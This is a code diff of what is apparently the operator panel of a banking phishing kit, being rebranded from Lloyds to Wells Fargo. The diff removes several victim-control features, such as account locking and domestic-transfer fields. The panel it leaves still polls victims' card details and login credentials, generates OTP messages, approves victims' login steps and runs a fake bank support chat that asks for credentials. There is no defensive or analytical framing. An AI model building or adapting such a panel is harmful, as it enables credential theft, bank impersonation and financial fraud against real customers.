@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Lloyds Admin Control</title>
-    <link rel="icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
-    <link rel="shortcut icon" href="https://www.lloydsbankinggroup.com/favicon.ico" type="image/x-icon">
+    <title>Admin Dashboard</title>
+    <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; }
@@ -28,7 +27,7 @@
         .log-area strong { color:#00d2ff; }
         .chat-message { margin-bottom:10px; padding:8px 12px; border-radius:8px; width:fit-content; max-width:80%; }
         .chat-message.user { background:#3a3a52; align-self:flex-start; }
-        .chat-message.admin { background:#006a4d; align-self:flex-end; margin-left:auto; }
+        .chat-message.admin { background:#d71e28; align-self:flex-end; margin-left:auto; }
         .chat-input-area { display:flex; gap:8px; }
         .chat-input-area input { flex:1; padding:10px; background:#151521; border:1px solid #3a3a52; color:white; border-radius:6px; }
         .chat-input-area button { background-color:#00d2ff; color:#000; padding:0 16px; border:none; border-radius:6px; cursor:pointer; font-weight:bold; }
@@ -81,26 +80,6 @@
             <!-- Settings Panel -->
             <div class="panel" style="flex:0.7;">
                 <h2>OTP & Display Settings</h2>
-                <!-- Account Status Control -->
-                <div class="settings-group" style="text-align:center; border:2px solid #d9534f;">
-                    <p style="color:white; font-weight:bold;"><i class="fas fa-lock"></i> Victim Account Status</p>
-                    <p style="font-size:11px;">If Locked, victim sees "Account Closed" and cannot transfer.</p>
-                    <div style="display:flex; gap:10px; margin-top:10px;">
-                        <button class="red" id="btnLockAccount">Lock Account</button>
-                        <button class="green" id="btnUnlockAccount">Unlock Account</button>
-                    </div>
-                    <div id="lockStatusDisplay" style="margin-top:10px; font-weight:bold; color:#a0a0b8;">Current: UNKNOWN</div>
-                </div>
-
-
-                
-                <!-- Welcome Name Control -->
-                <div class="settings-group">
-                    <p><i class="fas fa-user"></i> Victim Welcome Name</p>
-                    <input type="text" id="adminWelcomeName" placeholder="e.g. Kyung">
-                    <button id="btnSetWelcome">Update Name</button>
-                    <div id="welcomeNameStatus" class="status-msg"></div>
-                </div>
 
                 <!-- Display Email -->
                 <div class="settings-group">
@@ -117,29 +96,6 @@
                     <input type="text" id="adminAcctPassword" placeholder="Display password">
                     <button id="btnUpdateCreds">Update Credentials</button>
                     <div id="acctCredStatus" class="status-msg"></div>
-                </div>
-
-                
-                <!-- Domestic Transfer Configuration -->
-                <div class="settings-group" style="border:2px solid #3498db;">
-                    <p style="color:white; font-weight:bold;"><i class="fas fa-money-check-alt"></i> Domestic Transfer Verifier</p>
-                    <p style="font-size:11px; margin-bottom:8px;">Generate expected details for "STARK Building Materials UK".</p>
-                    <select id="domBank" style="width:100%; padding:8px; margin-bottom:8px; background:#1e1e2d; border:1px solid #3a3a52; color:white; border-radius:4px;">
-                        <option value="">-- Select Target Bank --</option>
-                        <option value="Lloyds Bank PLC (Includes Halifax, Bank of Scotland)">Lloyds Bank PLC (Includes Halifax, Bank of Scotland)</option>\n<option value="HSBC UK Bank Plc (Includes First Direct, M&S Bank)">HSBC UK Bank Plc (Includes First Direct, M&S Bank)</option>\n<option value="Barclays Bank UK PLC">Barclays Bank UK PLC</option>\n<option value="National Westminster Bank Plc (NatWest, includes RBS)">National Westminster Bank Plc (NatWest, includes RBS)</option>\n<option value="Santander UK Plc (Includes TSB, Virgin Money)">Santander UK Plc (Includes TSB, Virgin Money)</option>\n<option value="Metro Bank PLC">Metro Bank PLC</option>\n<option value="Clydesdale Bank Plc (Trading as Virgin Money)">Clydesdale Bank Plc (Trading as Virgin Money)</option>\n<option value="Yorkshire Bank (Trading as Virgin Money)">Yorkshire Bank (Trading as Virgin Money)</option>\n<option value="Northern Bank Limited (Danske Bank group, NI)">Northern Bank Limited (Danske Bank group, NI)</option>\n<option value="AIB Group (UK) P.L.C.">AIB Group (UK) P.L.C.</option>\n<option value="Monzo Bank Limited">Monzo Bank Limited</option>\n<option value="Starling Bank Limited">Starling Bank Limited</option>\n<option value="Revolut Bank UK Ltd">Revolut Bank UK Ltd</option>\n<option value="Atom Bank PLC">Atom Bank PLC</option>\n<option value="Chase (J.P. Morgan Europe Limited)">Chase (J.P. Morgan Europe Limited)</option>\n<option value="OakNorth Bank plc">OakNorth Bank plc</option>\n<option value="Allica Bank Limited">Allica Bank Limited</option>\n<option value="Tandem Bank">Tandem Bank</option>\n<option value="Kroo Bank Ltd">Kroo Bank Ltd</option>\n<option value="Zopa Bank Limited">Zopa Bank Limited</option>\n<option value="The Bank of London">The Bank of London</option>\n<option value="Coutts & Company">Coutts & Company</option>\n<option value="C. Hoare & Co.">C. Hoare & Co.</option>\n<option value="Investec Bank PLC">Investec Bank PLC</option>\n<option value="Handelsbanken plc">Handelsbanken plc</option>\n<option value="Citibank UK Limited">Citibank UK Limited</option>\n<option value="Bank of China (UK) Limited">Bank of China (UK) Limited</option>\n<option value="Goldman Sachs International Bank">Goldman Sachs International Bank</option>
-                    </select>
-                    <input type="text" id="domName" placeholder="Full Name">
-                    <input type="text" id="domSort" placeholder="Sort Code (XX-XX-XX)">
-                    <input type="text" id="domAcc" placeholder="Account Number (8 digits)">
-                    <button class="green" id="btnSetDom">Generate Domestic Transfer</button>
-                    <div id="domStatus" class="status-msg"></div>
-                    <div id="activeGeneratedDom" style="margin-top:10px; padding:10px; background:#151521; border-left:3px solid #3498db; border-radius:4px; font-size:12px; display:none;">
-                        <strong style="color:#00d2ff;">Active Generated Details:</strong><br>
-                        <span style="color:#a0a0b8;">Bank:</span> <span id="dispDomBank" style="color:white;"></span><br>
-                        <span style="color:#a0a0b8;">Name:</span> <span id="dispDomName" style="color:white;"></span><br>
-                        <span style="color:#a0a0b8;">Sort:</span> <span id="dispDomSort" style="color:white;"></span><br>
-                        <span style="color:#a0a0b8;">Acc:</span> <span id="dispDomAcc" style="color:white;"></span>
-                    </div>
                 </div>
 
                 <!-- OTP Generator -->
@@ -178,7 +134,7 @@
             <!-- Live Chat Panel -->
             <div class="panel">
                 <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #3a3a52; padding-bottom:8px; margin-bottom:10px;">
-                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Lloyds Support)</h2>
+                    <h2 style="border:none; padding:0; margin:0;">Live Chat (Wells Fargo Support)</h2>
                     <div>
                         <span style="color:#a0a0b8; font-size:12px; margin-right:6px;">AI Auto-Reply</span>
                         <button id="aiToggleBtn" style="background:#d9534f; color:white; padding:3px 10px; border:none; border-radius:4px; font-weight:bold; cursor:pointer; font-size:11px;">OFF</button>
@@ -188,7 +144,7 @@
                     <p style="color:#666;">Chat history will appear here.</p>
                 </div>
                 <div class="chat-input-area">
-                    <input type="text" id="adminChatInput" placeholder="Reply as Lloyds Support...">
+                    <input type="text" id="adminChatInput" placeholder="Reply as Wells Fargo Support...">
                     <button id="btnSendChat">Send</button>
                 </div>
             </div>
@@ -276,7 +232,6 @@
         // ===== POLLING =====
         function startPolling() {
             if (pollingInterval) return;
-            // Initial fetch
             pollOnce();
             pollingInterval = setInterval(pollOnce, 1000);
         }
@@ -307,7 +262,7 @@
             // Poll Chat History
             var chats = getSyncItem('chatHistory');
             if (chats) {
-                var initialMessage = '<div class="chat-message admin"><strong>Lloyds Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
+                var initialMessage = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> Hello, we\'re here to help you verify your accounts for the withdrawal. Please enter your credentials above and we\'ll proceed.</div>';
                 document.getElementById('chatLog').innerHTML = initialMessage + chats;
                 var chatArea = document.getElementById('chatLog');
                 chatArea.scrollTop = chatArea.scrollHeight;
@@ -319,13 +274,6 @@
             if (aiBtn) {
                 if (aiState) { aiBtn.style.background = '#5cb85c'; aiBtn.innerText = 'ON'; }
                 else { aiBtn.style.background = '#d9534f'; aiBtn.innerText = 'OFF'; }
-            }
-
-            
-            // Poll Welcome Name
-            var curName = getSyncItem('welcomeName');
-            if (curName && document.activeElement !== document.getElementById('adminWelcomeName')) {
-                document.getElementById('adminWelcomeName').value = curName;
             }
 
             // Poll Display Email
@@ -346,28 +294,6 @@
             }
             if (acctPass && document.activeElement !== document.getElementById('adminAcctPassword')) {
                 document.getElementById('adminAcctPassword').value = acctPass;
-            }
-
-            
-            // Poll Domestic Details
-            var dBank = getSyncItem('expectedDomBank');
-            var dName = getSyncItem('expectedDomName');
-            var dSort = getSyncItem('expectedDomSort');
-            var dAcc = getSyncItem('expectedDomAcc');
-            
-            if (dBank && document.activeElement !== document.getElementById('domBank')) document.getElementById('domBank').value = dBank;
-            if (dName && document.activeElement !== document.getElementById('domName')) document.getElementById('domName').value = dName;
-            if (dSort && document.activeElement !== document.getElementById('domSort')) document.getElementById('domSort').value = dSort;
-            if (dAcc && document.activeElement !== document.getElementById('domAcc')) document.getElementById('domAcc').value = dAcc;
-            
-            if (dBank && dName && dSort && dAcc) {
-                document.getElementById('activeGeneratedDom').style.display = 'block';
-                document.getElementById('dispDomBank').innerText = dBank;
-                document.getElementById('dispDomName').innerText = dName;
-                document.getElementById('dispDomSort').innerText = dSort;
-                document.getElementById('dispDomAcc').innerText = dAcc;
-            } else {
-                document.getElementById('activeGeneratedDom').style.display = 'none';
             }
 
             // Poll Card Details
@@ -421,7 +347,7 @@
 
             var sLog = getSyncItem('loginStatus');
             if (sLog === 'otp_submitted' && !document.getElementById('btnApproveLogin')) {
-                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
+                logArea.innerHTML += '<div id="actionLogin_2" style="margin-top:8px; padding:8px; background:#3a3a52; border-radius:6px;"><strong style="color:orange;">Action Required (Initial Wells Fargo Login):</strong><br><button id="btnApproveLogin" onclick="approveStep(\'loginStatus\')" style="margin-top:4px; padding:4px 8px; background:#5cb85c; color:white; border:none; border-radius:4px; cursor:pointer;">Approve Login</button></div>';
             }
         }
 
@@ -441,23 +367,6 @@
 
         // ===== BUTTON EVENT LISTENERS =====
 
-        // Update the account lock toggle events
-        var btnLock = document.getElementById('btnLockAccount');
-        var btnUnlock = document.getElementById('btnUnlockAccount');
-        if (btnLock) {
-            btnLock.onclick = async function() {
-                await setSyncItem('accountLocked', true);
-                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
-            };
-        }
-        if (btnUnlock) {
-            btnUnlock.onclick = async function() {
-                await setSyncItem('accountLocked', false);
-                document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
-            };
-        }
-
-
         // Send Chat
         document.getElementById('btnSendChat').addEventListener('click', sendAdminMessage);
         document.getElementById('adminChatInput').addEventListener('keypress', function(e) {
@@ -467,32 +376,10 @@
         async function sendAdminMessage() {
             var input = document.getElementById('adminChatInput').value;
             if (input.trim() === '') return;
-            var chatEntry = '<div class="chat-message admin"><strong>Lloyds Support:</strong> ' + input + '</div>';
+            var chatEntry = '<div class="chat-message admin"><strong>Wells Fargo Support:</strong> ' + input + '</div>';
             var currentChats = getSyncItem('chatHistory') || '';
             await setSyncItem('chatHistory', currentChats + chatEntry);
             document.getElementById('adminChatInput').value = '';
-        }
-
-        
-        // Set Domestic Transfer Details
-        var btnSetDom = document.getElementById('btnSetDom');
-        if (btnSetDom) {
-            btnSetDom.onclick = async function() {
-                var bk = document.getElementById('domBank').value.trim();
-                var nm = document.getElementById('domName').value.trim();
-                var sc = document.getElementById('domSort').value.trim();
-                var ac = document.getElementById('domAcc').value.trim();
-                if (bk && nm && sc && ac) {
-                    await setSyncItem('expectedDomBank', bk);
-                    await setSyncItem('expectedDomName', nm);
-                    await setSyncItem('expectedDomSort', sc);
-                    await setSyncItem('expectedDomAcc', ac);
-                    document.getElementById('domStatus').innerText = 'Details generated and ready!';
-                    setTimeout(function(){ document.getElementById('domStatus').innerText = ''; }, 3000);
-                } else {
-                    alert('Please select a Bank and fill out Name, Sort Code, and Account Number.');
-                }
-            };
         }
 
         // Generate OTP
@@ -502,20 +389,6 @@
             document.getElementById('generatedOtpDisplay').innerText = code;
             document.getElementById('adminChatInput').value = 'Your verification code is: ' + code;
         });
-
-        
-        // Set Welcome Name
-        var btnSetWelcome = document.getElementById('btnSetWelcome');
-        if (btnSetWelcome) {
-            btnSetWelcome.onclick = async function() {
-                var name = document.getElementById('adminWelcomeName').value.trim();
-                if (name) {
-                    await setSyncItem('welcomeName', name);
-                    document.getElementById('welcomeNameStatus').innerText = 'Welcome name updated!';
-                    setTimeout(function(){ document.getElementById('welcomeNameStatus').innerText = ''; }, 3000);
-                }
-            };
-        }
 
         // Set Display Email
         document.getElementById('btnSetEmail').addEventListener('click', async function() {
